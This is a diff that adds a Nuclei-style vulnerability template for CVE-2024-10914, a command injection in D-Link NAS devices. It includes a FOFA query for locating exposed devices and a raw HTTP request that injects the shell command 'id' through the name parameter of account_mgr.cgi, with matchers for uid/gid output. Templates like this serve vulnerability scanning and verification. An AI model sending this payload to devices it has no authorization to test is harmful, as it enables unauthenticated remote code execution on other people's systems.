@@ -1,0 +1,36 @@
+id: D-Link-NAS-account_mgr_cgi-rce-CVE-2024-10914
+
+info:
+  name: "D-Link NAS设备account_mgr.cgi接口cgi_user_add命令注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="D_Link-DNS-ShareCenter"
+      D-Link NAS设备中`account_mgr.cgi`脚本存在命令注入缺陷（CVE-2024-10914），攻击者可通过构造恶意HTTP GET请求实现未经身份验证的远程代码执行。该漏洞源于`cgi_user_add`命令的`name`参数缺乏充分的输入验证机制，导致攻击者能够注入并执行任意系统命令。受影响设备包括DNS-320、DNS-320LW、DNS-325和DNS-340L等型号，CVSSv4评分9.2表明漏洞具有高危风险。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247489348&idx=1&sn=57152c749e1fa98e23c06d16f56b0aca&chksm=c267a277f5102b612b79969a7daff2e154896e3a6223265dfde0c89d199b0b2c44c129bf4561&token=279945389&lang=zh_CN#rd
+  tags: D-Link,DNS-ShareCenter
+
+http:
+- raw:
+  - |
+    GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;id;%27 HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    condition: and
+  - type: status
+    status:
+    - 200
+
+
+
+
+
